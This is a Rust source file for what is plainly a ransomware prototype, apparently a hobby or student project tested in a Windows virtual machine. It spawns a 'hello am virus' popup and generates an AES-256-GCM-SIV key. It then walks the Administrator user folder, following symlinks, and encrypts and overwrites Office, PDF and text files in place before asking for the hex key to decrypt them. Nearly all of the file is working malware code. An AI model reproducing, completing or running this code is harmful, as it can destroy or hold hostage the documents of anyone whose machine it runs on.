#![allow(warnings)]
#[allow(dead_code)]
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::Aead;
use aes_gcm_siv::Error as AesGcmSivError;
use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
use crossterm::event::{poll, read, Event, KeyCode};
use crypto::common::typenum::U32;
use dialog::{backends::Zenity, DialogBox};
use eframe::egui;
use egui::containers;
use hex;
use rand_chacha::rand_core::{RngCore, SeedableRng};
use rand_chacha::ChaCha20Rng;
use std::f32::consts::E;
use std::ffi::OsStr;
use std::fmt;
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::process::Command;
use std::{io, path::Path};
use walkdir::{DirEntry, Error, WalkDir};
//TODO: check the speed of this later
//TODO: gonna need to add more later,

/**
 * Use AES-256
 * Same key for all files, different nonce for each file
 *
 * Notes: nonce is to make sure 2 identical plaintexts produce different output
 * counter is to make sure 2 identical blocks within the same plaintext produce different output
 *
 * Returns: the cipher object
 */
fn main() {
    // create a popup on windows systems

    match Command::new("cmd")
        .arg("/C")
        .arg("start cmd /K echo hello am virus")
        .spawn()
    {
        Ok(child) => {
            println!("Child process: {:?}", child);
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    }

    let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
                                      // let nonce = Nonce::from_slice(&nonce_array);
    let key = Aes256GcmSiv::generate_key(rng);
    let mut cipher = Aes256GcmSiv::new(&key);
    let _ = traverse(true, &mut cipher); //iterates through all the files and calls the encrypt function on each one
                                         // let test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
                                         // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
    println!("Cipher key before user input: {:?}", hex::encode(&key));
    let _ = traverse(false, &mut cipher);
}

// fn display_message() {
//     //popup WITH THE DECRYPTION KEY ON THE POPUP
//     //idk what to use for thsi
// }

/**
 * This is a test function to make sure the encryption is working
 *
 * only encrypts the files on the desktop. used for testing so i dont break anything accidentally
 */
// fn test_encryptfile() {
//     //the file in the windows vm is called restored
//     let mut testfile = File::open("restored").expect("can't open file o no");
//     let mut buffer = Vec::new();
//     testfile
//         .read_to_end(&mut buffer)
//         .expect("can't load file contents");

//     //call the generate key function
//     let mut rng = ChaCha20Rng::from_entropy();
//     let mut nonce_array = [0u8; 12];
//     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
//     let nonce = Nonce::from_slice(&nonce_array);

//     //FIXME: up to here. making the nonce
//     let key = Aes256GcmSiv::generate_key(rng);
//     let cipher = Aes256GcmSiv::new(&key);

//     let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
//     //put the ciphertext back in the file

//     testfile.set_len(0);
//     testfile.write_all(&ciphertext.unwrap().as_slice()); //tvector -> slice
//                                                          //why this no work tho

//     //print the key and nonce TODO: check if :? is alg or display
//     println!("key: {:?}", key);

//     //TODO: !!!!! read the contents of the file!
//     //this will be in the completed code but not in this test function because im lazy

//     loop {
//         //delay and wait for user to enter the decryption key
//         //TODO: print the key needed for decryption
//         let mut user_input = String::new();
//         println!("Enter decryption key pls: ");
//         io::stdin().read_line(&mut user_input).unwrap();
//         let user_input_str = user_input.as_bytes(); //convert to bytes

//         //TODO: UP TO HERE TODAY
//         //key length 32, nonce length 12
//         if user_input_str.len() != 32 {
//             //print error
//             println!("Invalid key length");
//         } else {
//             // //FIXME: convert byte array into key format why this no work
//             // //WHY THIS NO WORK
//             // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
//             // //decrypt using the key
//             // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
//         }
//         //convert to key
//     }
//     //TODO: put user input into the correct variable type
//     //try decrypting with this key, print if it works or not
// }

/**
 *
 * Note
 * find all the files in subdirectories.
 * follow symlinks, don't skip hidden files
 *
 * FIXME: this will probably mess up some system files, fix later
 */
fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
    //return result
    //search recursively through all directories and find files
    let test_file = File::create("C:\\Users\\win11\\Desktop\\output.txt");

    if !do_encrypt {
        loop {
            let mut user_input = String::new();
            println!("Enter decryption key pls: ");
            io::stdin().read_line(&mut user_input).unwrap();
            let user_input_str = user_input.trim(); //convert to bytes

            //key length 32, nonce length 12
            if user_input_str.len() != 64 {
                //64 because it's in hex
                //print error
                println!("Invalid key length: {}", user_input_str.len());
                //FIXME: return here
            } else {
                let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
                let decrypt_key: GenericArray<u8, U32> =
                    GenericArray::clone_from_slice(&user_input_bytes.as_slice());
                println!(
                    "Cipher key after user input: {:?}",
                    hex::encode(&decrypt_key)
                );
                //FIXME: initialize cipher here
                *cipher = Aes256GcmSiv::new(&decrypt_key);
                break;
            }
        }
    }

    let valid_extensions = vec!["txt", "pdf", "docx", "doc", "pptx", "ppt", "xlsx", "xls"];

    for entry in WalkDir::new("C:\\Users\\Administrator\\").follow_links(true) {
        match entry {
            Ok(entry) => {
                if let Some(extension) = entry.path().extension() {
                    if entry.file_type().is_file()
                        && valid_extensions.contains(&extension.to_str().unwrap_or(""))
                    {
                        // writeln!(
                        //     //this is just debug code
                        //     test_file.as_ref().unwrap(),
                        //     "found file: {}",
                        //     entry.path().display()
                        // );
                        //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
                        //FIXME: herererer
                        if do_encrypt {
                            let _ = encrypt(entry.path(), &cipher);

                            // encrypt(entry.path(), cipher);
                        } else {
                            match decrypt(entry.path(), &cipher) {
                                Ok(_) => {
                                    let _ = writeln!(
                                        test_file.as_ref().unwrap(),
                                        "Decrypted file: {}",
                                        entry.path().display()
                                    );
                                }
                                Err(e) => {
                                    let _ = writeln!(
                                        test_file.as_ref().unwrap(),
                                        "Error decrypting file: {}",
                                        e
                                    );
                                    continue;
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => {
                let _ = writeln!(test_file.as_ref().unwrap(), "Error: {}", e);
            }
        }
    }
    Ok(())
}

pub struct MyError {
    message: String,
}

impl From<std::io::Error> for MyError {
    fn from(err: std::io::Error) -> Self {
        Self {
            message: err.to_string(),
        }
    }
}

impl From<walkdir::Error> for MyError {
    fn from(err: walkdir::Error) -> Self {
        Self {
            message: err.to_string(),
        }
    }
}

impl From<AesGcmSivError> for MyError {
    fn from(err: AesGcmSivError) -> Self {
        Self {
            message: format!("aes_gcm_siv error: {}", err),
        }
    }
}

impl std::fmt::Display for MyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.message)
    }
}

// impl From<std::io::Error> for MyError {
//     fn from(err: std::io::Error) -> Self {
//         Self {
//             message: err.to_string(),
//         }
//     }
// }

/**
 * Encrypt a file, using given path and the same key for all files
 * Use different nonce for each file, prepend to file
 */
fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
    //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
    // Open a file with append option

    println!("encrypting file: {}", path.display()); //FIXME: error testing

    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    drop(file); //close the file (drop it)

    let mut file = File::create(path)?;

    //TODO: make a nonce, use it, append to the beginning or end of file
    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array);
    let nonce = Nonce::from_slice(&nonce_array);
    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
    //put the ciphertext bac into the file
    let _ = file.set_len(0);
    file.write_all(&nonce_array)?;
    let _ = file.write_all(&ciphertext.unwrap().as_slice());
    Ok(())
}

/**
 * Decrypt a file using a given key
 * this is not finished. the main decryption is in main atm
 */
fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), MyError> {
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    //FIXME: get nonce from first 12 bytes from file
    let nonce = Nonce::from_slice(&buffer[0..12]);
    let ciphertext = &buffer[12..];

    // let cipher = Aes256GcmSiv::new(&decrypt_key);
    println!("decrypting file: {}", path.display());
    match cipher.decrypt(nonce, ciphertext.as_ref()) {
        Ok(plaintext) => {
            drop(file);
            let mut file = File::create(path)?;
            file.set_len(0)?;
            file.write_all(&plaintext.as_slice())?;
        }
        Err(e) => {
            eprintln!("Decrypt fail: {:?}", e); //FIXME: return
                                                //skip fail
                                                // return Err(e.into());
                                                // return Err(MyError::from(e));
        }
    }

    Ok(())
}
